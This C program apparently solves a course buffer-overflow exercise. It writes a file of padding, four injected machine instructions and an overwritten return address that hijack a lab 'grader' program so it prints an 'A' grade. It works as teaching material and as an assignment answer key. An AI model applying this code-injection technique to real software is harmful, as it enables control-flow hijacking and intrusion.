#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"

#define TOTAL_BUFFER_BYTES    48
#define CRITICAL_GRADE_ADDR   0x420044
#define GRADE_PRINT_ADDR      0x40089c
#define RETURN_OVERRIDE_ADDR  0x420078
#define NAME_REGION_ADDR      0x420058
#define NAME_BYTE_LEN         9
#define INSTR_BLOCK_SIZE      16
#define PADDING_AMOUNT        22
#define ASCII_CAPITAL_A       0x41

int main(void) {
    const char *pcIdentity = "AnishKKat";
    FILE *pOutHandle = fopen("dataA", "w");
    if (!pOutHandle) return 1;

    unsigned int uiLoadAVal;
    unsigned int uiGetGradeAddr;
    unsigned int uiStoreAInGrade;
    unsigned int uiBranchPrint;
    unsigned long ulManipulatedReturn;
    int iIndex;

    fwrite(pcIdentity, 1, NAME_BYTE_LEN, pOutHandle);
    fputc('\0', pOutHandle);

    iIndex = 0;
    while (iIndex < PADDING_AMOUNT) {
        fputc('\0', pOutHandle);
        iIndex++;
    }

    uiGetGradeAddr = MiniAssembler_adr(1, CRITICAL_GRADE_ADDR, 0x42007c);
    uiLoadAVal = MiniAssembler_mov(0, ASCII_CAPITAL_A);
    uiStoreAInGrade = MiniAssembler_strb(0, 1);
    uiBranchPrint = MiniAssembler_b(GRADE_PRINT_ADDR, 0x420084);

    fwrite(&uiLoadAVal, sizeof(unsigned int), 1, pOutHandle);
    fwrite(&uiGetGradeAddr, sizeof(unsigned int), 1, pOutHandle);
    fwrite(&uiStoreAInGrade, sizeof(unsigned int), 1, pOutHandle);
    fwrite(&uiBranchPrint, sizeof(unsigned int), 1, pOutHandle);

    ulManipulatedReturn = RETURN_OVERRIDE_ADDR;
    fwrite(&ulManipulatedReturn, sizeof(unsigned long), 1, pOutHandle);

    fclose(pOutHandle);
    return 0;
}